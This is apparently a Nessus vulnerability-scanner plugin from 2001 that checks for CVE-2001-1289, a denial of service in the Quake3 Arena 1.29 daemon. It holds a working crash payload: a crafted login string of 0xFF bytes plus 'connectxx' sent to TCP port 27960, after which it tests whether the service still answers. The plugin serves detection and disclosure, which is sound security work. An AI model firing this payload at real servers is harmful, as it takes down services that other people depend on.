#
# This script was written by Michel Arboi <arboi@alussinan.org>, starting 
# from miscflood.nasl
#
# Script audit and contributions from Carmichael Security <http://www.carmichaelsecurity.com>
#      Erik Anderson <eanders@carmichaelsecurity.com>
#      Added BugtraqID and CVE
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10931);
 script_bugtraq_id(3123);
 script_version("$Revision: 1.9 $");
 script_cve_id("CVE-2001-1289");
 name["english"] = "Quake3 Arena 1.29 f/g DOS";
 name["francais"] = "Déni de service contre Quake3 Arena 1.29 f/g";
 script_name(english:name["english"], francais:name["francais"]);
 
 desc["english"] = "
It was possible to crash the Quake3 Arena daemon by sending a specially
crafted login string.

A cracker may use this attack to make this service crash continuously, 
preventing you from playing.

Solution: upgrade your software
Risk factor : Low";


 desc["francais"] = "Il a été possible de
faire planter le démon Quake3 Arena en lui
envoyant une séquence de connexion spéciale.

Un pirate peut exploiter cette faille 
pour faire planter continuellement ce
service, vous empêchant ainsi de jouer.

Solution: mettez à jour votre logiciel

Facteur de risque : Bas";

 script_description(english:desc["english"], francais:desc["francais"]);
 
 summary["english"] = "Quake3 Arena DOS";
 summary["francais"] = "Déni de service contre Quake3 Arena";
 script_summary(english:summary["english"], francais:summary["francais"]);
 
 script_category(ACT_DESTRUCTIVE_ATTACK);
 
 script_copyright(english:"This script is Copyright (C) 2001 Michel Arboi",
		francais:"Ce script est Copyright (C) 2001 Michel Arboi");
 family["english"] = "Denial of Service";
 family["francais"] = "Déni de service";

 script_family(english:family["english"], francais:family["francais"]);
 script_require_ports(27960);
 exit(0);
}

#

function test_q3_port(port)
{
 if (! get_port_state(port))
  return(0);

 soc = open_sock_tcp(port);
 if (!soc)
  return(0);
 s = string(raw_string(0xFF, 0xFF, 0xFF, 0xFF), "connectxx");
 send(socket:soc, data:s);
 close(soc);

 soc = open_sock_tcp(port);
 if (! soc)
 {
  security_hole(port);
 }

 if (soc)
  close(soc);
 return(1);
}

test_q3_port(port:27960);

